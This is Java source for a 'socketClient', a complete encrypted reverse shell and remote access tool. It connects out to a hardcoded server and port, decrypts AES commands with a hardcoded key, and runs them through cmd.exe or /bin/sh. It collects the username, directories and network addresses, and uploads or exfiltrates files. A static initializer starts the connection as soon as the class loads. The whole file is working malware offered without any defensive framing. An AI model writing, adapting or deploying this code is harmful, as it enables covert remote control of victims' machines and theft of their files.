package org.example;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;


public class socketClient {//客户端
    static String key = "I72YPGxLFctx1GnG";
    socketClient(){
        String ip = "127.0.0.1";
        int port = 65434;
        String[] shell = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
        String currentDir = System.getProperty("user.dir");
        System.out.println();
        try {
            Socket s = new Socket(ip, port);
            InputStream is = s.getInputStream();
            DataInputStream dis = new DataInputStream(is);
            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeUTF(currentDir);
            while (true){
                String cmd = dis.readUTF();
                if ("exit".equalsIgnoreCase(decrypt(cmd))){
                    break;
                }
                else if("info".equalsIgnoreCase(decrypt(cmd))) {
                    dos.writeUTF(encrypt(info()));
                }
                else if (decrypt(cmd).startsWith("upload")) {
                    receiveFile(dis, dos);
                }else if (decrypt(cmd).startsWith("download")){
                    sendFile2Server(dis, dos);
                }
                else {
                    String[] cmder = {shell[0], shell[1], decrypt(cmd)};
                    dos.writeUTF(encrypt(executeCmd(cmder)));
                }

            }
            dis.close();
            is.close();
            dos.close();
            os.close();
            s.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public String info() throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        String os = System.getProperty("os.name");
        stringBuilder.append("os: ").append(os).append("\n");
        String username = System.getProperty("user.name");
        stringBuilder.append("whoami: ").append(username).append("\n");
        String home = System.getProperty("user.home");
        stringBuilder.append("home: ").append(home).append("\n");
        String dir = System.getProperty("user.dir");
        stringBuilder.append("dir: ").append(dir).append("\n");
        stringBuilder.append("newtork: ").append("\n");
        java.util.Enumeration<java.net.NetworkInterface> nifs = java.net.NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            java.net.NetworkInterface nif = nifs.nextElement();
            java.util.Enumeration<java.net.InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                java.net.InetAddress addr = addresses.nextElement();
                stringBuilder.append("address: ").append(addr.getHostAddress()).append(", interface: ").append(nif.getName()).append("\n");
            }
        }
        return stringBuilder.toString();
    }

    private void receiveFile(DataInputStream dis, DataOutputStream dos) throws Exception {

            String destinationPath = decrypt(dis.readUTF());
            long fileLength = dis.readLong();

            File targetFile = new File(destinationPath);
            try (FileOutputStream fos = new FileOutputStream(targetFile)) {
                byte[] buffer = new byte[4096];
                long bytesReceived = 0;
                int bytesRead;
                while (bytesReceived < fileLength) {
                    bytesRead = dis.read(buffer);
                    fos.write(buffer, 0, bytesRead);
                    bytesReceived += bytesRead;
                }
            }

            dos.writeUTF(encrypt("upload_success"));
    }
    private static void sendFile2Server(DataInputStream dis, DataOutputStream dos) throws Exception {
        String localFilePath = decrypt(dis.readUTF());
        File file = new File(localFilePath);
        if (!file.exists()) {
            return;
        }
        long fileLength = file.length();
        dos.writeLong(fileLength);
        byte[] buffer = new byte[4096];
        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
        }
        dos.writeUTF(encrypt("download_success"));
    }
    public String executeCmd(String[] cmd) throws IOException {
        try{
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(cmd);
            // 使用BufferedReader读取命令的输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return String.valueOf(output);
        }
        catch (Exception e){
            return String.valueOf(e);
        }

    }
    static {
        new socketClient();
    }
    public static void main(String[] args) {
        new socketClient();
    }
    public static String encrypt(String cmd) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE,secretKeySpec);
        byte[] bytes = cipher.doFinal(cmd.getBytes());
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static String decrypt(String encryptedData) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        byte[] original = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
        return new String(original);
    }
}